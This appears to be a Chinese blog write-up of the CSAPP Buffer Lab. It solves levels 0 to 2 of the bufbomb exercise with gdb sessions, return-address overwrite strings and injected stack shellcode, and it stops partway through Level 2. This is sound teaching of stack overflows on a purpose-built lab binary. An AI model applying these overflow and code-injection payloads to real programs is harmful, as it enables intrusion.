@@ -1,0 +1,696 @@
+
+ <!DOCTYPE HTML>
+<html lang="Chinese">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  
+    <title>深入理解计算机系统|CSAPP-Bufferlab | 只为不凡而来</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="wuduozhi">
+    
+
+    
+    <meta name="description" content="简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。 预备知识 IA32的栈帧结构，可参考：深入理解计算机系统|汇编的世界-5 gdb调试，可参考：工具|gdb调试  实验准备实验讲义中主要包含了以下3个可执行文件：  bufbomb 你所要攻击的缓冲区炸弹程序 makecoo">
+<meta name="keywords" content="深入理解计算机系统|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入理解计算机系统|CSAPP-Bufferlab">
+<meta property="og:url" content="http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/index.html">
+<meta property="og:site_name" content="只为不凡而来">
+<meta property="og:description" content="简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。 预备知识 IA32的栈帧结构，可参考：深入理解计算机系统|汇编的世界-5 gdb调试，可参考：工具|gdb调试  实验准备实验讲义中主要包含了以下3个可执行文件：  bufbomb 你所要攻击的缓冲区炸弹程序 makecoo">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-01.png">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-02.png">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-03.png">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-04.png">
+<meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-05.png">
+<meta property="og:updated_time" content="2018-05-11T14:57:17.693Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="深入理解计算机系统|CSAPP-Bufferlab">
+<meta name="twitter:description" content="简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。 预备知识 IA32的栈帧结构，可参考：深入理解计算机系统|汇编的世界-5 gdb调试，可参考：工具|gdb调试  实验准备实验讲义中主要包含了以下3个可执行文件：  bufbomb 你所要攻击的缓冲区炸弹程序 makecoo">
+<meta name="twitter:image" content="http://yoursite.com/images/CSAPP-BufferLab-01.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="只为不凡而来" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/unnamed4_n_mSY_icon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/profile.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/profile.png">
+    
+    <link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+  <body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="只为不凡而来" title="只为不凡而来"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="只为不凡而来">只为不凡而来</a></h1>
+				<h2 class="blog-motto">小智的世界</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/" title="深入理解计算机系统|CSAPP-Bufferlab" itemprop="url">深入理解计算机系统|CSAPP-Bufferlab</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="wuduozhi" target="_blank" itemprop="author">wuduozhi</a>
+		
+  <p class="article-time">
+    <time datetime="2018-05-11T20:29:36.000Z" itemprop="datePublished"> 发表于 2018-05-12</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验准备"><span class="toc-number">3.</span> <span class="toc-text">实验准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始攻关"><span class="toc-number">4.</span> <span class="toc-text">开始攻关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-0-Candle"><span class="toc-number">4.1.</span> <span class="toc-text">Level 0 Candle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1-Sparkler"><span class="toc-number">4.2.</span> <span class="toc-text">Level 1 Sparkler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2-Firecracker"><span class="toc-number">4.3.</span> <span class="toc-text">Level 2 Firecracker</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用<code>缓冲区溢出漏洞</code>生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
+<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
+<li>IA32的栈帧结构，可参考：<a href="http://wuduozhi.me/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/" target="_blank" rel="external">深入理解计算机系统|汇编的世界-5</a></li>
+<li>gdb调试，可参考：<a href="http://wuduozhi.me/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/" target="_blank" rel="external">工具|gdb调试</a></li>
+</ul>
+<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>实验讲义中主要包含了以下3个可执行文件：</p>
+<ul>
+<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
+<li>makecookie 根据你所输入的userid生成一个cookie</li>
+<li>hex2raw 一个生成攻击字符串的工具</li>
+</ul>
+<p>值得注意的是，<code>bufbomb</code>接受如下的参数：</p>
+<ul>
+<li>-h 打印帮助信息</li>
+<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
+<li>-n 进入’Nitro’模式，在阶段4中使用</li>
+<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
+</ul>
+<p>首先我们要输入userid生成一个cookie供后续使用，我这里使用uesrud为<code>xzz</code>。命令及结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie xzz &gt; cookie                       user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie   </div><div class="line">0x52f8c747</div></pre></td></tr></table></figure>
+<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<code>objdump -d bufbomb &gt; bufbomb.s</code> 。</p>
+<p>目标程序的通过<code>getbuf</code>函数从标准输入流中读取字符串，该函数具有缓冲区溢出的漏洞，我们的实验都是通过这个函数的漏洞展开的。</p>
+<p><code>getbuf</code>函数：</p>
+<pre><code>/ * Buffer size for getbuf* /
+#define NORMAL_BUFFER_SIZE 32
+
+int getbuf()
+{
+    char buf[NORMAL_BUFFER_SIZE];
+    Gets(buf);
+    return 1;
+}
+</code></pre><p><code>getbuf</code>函数的反汇编格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure></p>
+<p>注意到函数总共开辟了<code>0x38=56</code>个字节的栈空间，然后<code>lea -0x28(%ebp),%eax</code>和<code>mov %eax,(%esp)</code>进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而<code>ebp</code>指向栈底，我们可以推测缓冲区总共是0x28=40个字节。所以能得到<code>getbuf</code>函数的栈帧如下图：</p>
+<p><img src="/images/CSAPP-BufferLab-01.png" alt="getbuf栈帧"></p>
+<p>那么所谓的缓冲区溢出也就是破坏<code>buf</code>到返回地址的内存空间，把需要跳转的地址通过溢出填入到返回地址中，改变程序的执行顺序。</p>
+<h3 id="开始攻关"><a href="#开始攻关" class="headerlink" title="开始攻关"></a>开始攻关</h3><h4 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0 Candle"></a>Level 0 Candle</h4><p>The function getbuf is called within BUFBOMB by a function test having the following C code:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* test */</div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    int val;</div><div class="line">    /* Put canary on stack to detect possible corruption */</div><div class="line">    volatile int local = uniqueval();</div><div class="line">    val = getbuf();</div><div class="line">    /* Check for corrupted stack */</div><div class="line">    if (local != uniqueval()) &#123;</div><div class="line">	    printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</div><div class="line">    &#125;else if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Boom!: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    	validate(3);</div><div class="line">    &#125; else &#123;</div><div class="line">    	printf(&quot;Dud: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void smoke()</div><div class="line">&#123;</div><div class="line">    printf(&quot;Smoke!: You called smoke()\n&quot;);</div><div class="line">    validate(0);</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。通过反汇编得到smoke的汇编代码，可以得到smoke的起始地址<code>080490ba</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080490ba &lt;smoke&gt;:</div><div class="line"> 80490ba:	55                   	push   %ebp</div><div class="line"> 80490bb:	89 e5                	mov    %esp,%ebp</div><div class="line"> 80490bd:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 80490c0:	c7 04 24 b5 9f 04 08 	movl   $0x8049fb5,(%esp)</div><div class="line"> 80490c7:	e8 74 f8 ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 80490cc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490d3:	e8 0c 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 80490d8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490df:	e8 ac f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
+<p>根据以上的信息，我们的攻击代码 level0.txt 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 ba 90 04 08 /* 保存的%ebp以及返回地址 注意是小端机器*/</div></pre></td></tr></table></figure></p>
+<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level0.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<h4 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1 Sparkler"></a>Level 1 Sparkler</h4><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">void fizz(int val)</div><div class="line">&#123;</div><div class="line">    if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Fizz!: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    	validate(1);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    </div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0804906f &lt;fizz&gt;:</div><div class="line"> 804906f:	55                   	push   %ebp</div><div class="line"> 8049070:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049072:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049075:	8b 45 08             	mov    0x8(%ebp),%eax</div><div class="line"> 8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 804907e:	75 1e                	jne    804909e &lt;fizz+0x2f&gt;</div><div class="line"> 8049080:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049084:	c7 04 24 97 9f 04 08 	movl   $0x8049f97,(%esp)</div><div class="line"> 804908b:	e8 50 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049090:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</div><div class="line"> 8049097:	e8 48 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 804909c:	eb 10                	jmp    80490ae &lt;fizz+0x3f&gt;</div><div class="line"> 804909e:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 80490a2:	c7 04 24 b8 a1 04 08 	movl   $0x804a1b8,(%esp)</div><div class="line"> 80490a9:	e8 32 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 80490ae:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490b5:	e8 d6 f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
+<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数<code>fizz</code>的起始地址为<code>0804906f</code>，<code>val</code>保存在<code>0x8(%ebp)</code>中，cookie保存在固定的地址<code>0x804c1e4</code>中。根据以上的信息，我们的攻击代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 6f 90 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 47 c7 f8 52 /* cookie */</div></pre></td></tr></table></figure>
+<p>注意到，从<code>getbuf</code>返回的时候，内存是这样的一个状态：</p>
+<p><img src="/images/CSAPP-BufferLab-02.png" alt="level-01"></p>
+<p>此时，已经跳转到 <code>fizz</code>函数哪里了，但现在的<code>%ebp</code>的值是<code>0x00000000</code>,不过幸好有<code>mov    %esp,%ebp</code>这条指令，把<code>%ebp</code>拯救回来，才能使<code>mov    0x8(%ebp),%eax</code>能得到我们放入的cookie。这时的内存状态是这样的：</p>
+<p><img src="/images/CSAPP-BufferLab-03.png" alt="level-01"></p>
+<p>执行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level1.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Fizz!: You called fizz(0x52f8c747)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<h4 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2 Firecracker"></a>Level 2 Firecracker</h4><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int global_value = 0;</div><div class="line">void bang(int val)</div><div class="line">&#123;</div><div class="line">    if (global_value == cookie) &#123;</div><div class="line">	    printf(&quot;Bang!: You set global_value to 0x%x\n&quot;, global_value);</div><div class="line">    	validate(2);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: global_value = 0x%x\n&quot;, global_value);</div><div class="line"></div><div class="line">	exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。那怎么设置呢？<strong>在栈上构建一段代码，然后在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang</strong>。</p>
+<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) print /x $ebp</div><div class="line">$1 = 0x55683450</div><div class="line">(gdb) print /x $esp</div><div class="line">$2 = 0x55683418</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>通过在gdb中添加断点并观察，我们可以确定在执行函数<code>getbuf</code>时，栈底<code>%ebp</code>的值为<code>0x55683450</code>。</p>
+<p>接下来我们要通过gcc和objdump生成攻击代码。我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，攻击代码的作用就是设置全解变量的值为cookie的值，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x52f8c747, %eax</div><div class="line">mov %eax, 0x804c1ec  ;设置全局变量</div><div class="line">add $16, %esp ;修改栈顶</div><div class="line">ret ;返回</div></pre></td></tr></table></figure>
+<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gcc -m32 -c level2-exploit.s </div><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ objdump -d level2-exploit.o</div><div class="line"></div><div class="line">level2-exploit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 47 c7 f8 52       	mov    $0x52f8c747,%eax</div><div class="line">   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec</div><div class="line">   a:	83 c4 10             	add    $0x10,%esp</div><div class="line">   d:	c3                   	ret</div></pre></td></tr></table></figure>
+<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 34 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 47 c7 f8 52 a3 ec c1 </div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">22 90 04 08  			/* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
+<p>可以知道，我们的攻击思路是：<strong>在getbuf函数返回的时候，先将<code>pc</code>跳转到我们刚刚设计的攻击代码开始的地方，执行我们设计的攻击代码，设置全局变量的值，然后在跳转到<code>bang</code>函数执行。</strong></p>
+<p>可能疑惑为什么要这么做？是怎么知道全局变量的地址的呢？为什么要修改栈指针且要加16呢？接下来一一解答：</p>
+<p>对于全局变量的指针，我们可以通过<code>bang</code>函数的反汇编代码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">08049022 &lt;bang&gt;:</div><div class="line"> 8049022:	55                   	push   %ebp</div><div class="line"> 8049023:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049025:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049028:	a1 ec c1 04 08       	mov    0x804c1ec,%eax</div><div class="line"> 804902d:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8049033:	75 1e                	jne    8049053 &lt;bang+0x31&gt;</div><div class="line"> 8049035:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049039:	c7 04 24 90 a1 04 08 	movl   $0x804a190,(%esp)</div><div class="line"> 8049040:	e8 9b f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049045:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</div><div class="line"> 804904c:	e8 93 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8049051:	eb 10                	jmp    8049063 &lt;bang+0x41&gt;</div><div class="line"> 8049053:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049057:	c7 04 24 79 9f 04 08 	movl   $0x8049f79,(%esp)</div><div class="line"> 804905e:	e8 7d f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049063:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 804906a:	e8 21 f9 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
+<p>在level-1中我们知道<code>0x804c1e4</code>是cookie的地址，那么这里<code>0x804c1ec</code>显然就是全局变量的地址了。</p>
+<p>从getbuf返回时，我们的内存是这样的：</p>
+<p><img src="/images/CSAPP-BufferLab-04.png" alt="level-2"></p>
